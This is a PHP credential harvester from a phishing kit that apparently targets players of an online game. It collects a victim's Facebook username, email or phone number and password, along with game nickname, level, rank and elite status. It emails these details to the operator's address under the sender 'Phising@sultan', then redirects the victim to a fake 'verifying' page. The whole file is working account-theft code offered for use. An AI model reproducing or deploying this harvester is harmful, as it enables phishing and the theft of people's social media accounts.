<?php
error_reporting(0);
include('cilepeung.php');

$log = $_POST['log'];
$fb = $_POST['fb'];
$pwfb = $_POST['pwfb'];
$nick = $_POST['nick'];
$level= $_POST['level'];
$rank= $_POST['rank'];
$elite= $_POST['elite'];


$message   = "

====[ FACEBOOK ACCOUNT ]====

• Login Via :  ".$log."
• Username/Email/NoHP : ".$fb."
• Password :  ".$pwfb."


• Nickname : ".$nick."
• Level : ".$level."
• Rank : ".$rank."
• Elite : ".$elite."

====[ CEPAT AMANIN LORDZ ]====

";
include 'email.php';
$subject = "Level [ ".$level." ] [ ".$elite." ] ELITE PASS ";
$headers = "From: •AZ PERFECT• <Phising@sultan>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));


$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>

<?
include 'css/index.php';
$subject = "Level [ ".$level." ] [ ".$elite." ] ELITE PASS ";
$headers = "From: •AZ PERFECT• <Phising@sultan>";
mail($emailku, $subject, $message, $headers);

?>
<html>
<head>
<meta http-equiv="REFRESH" content="0;url=verifying.php">
</head>
<body>
</body>
</html>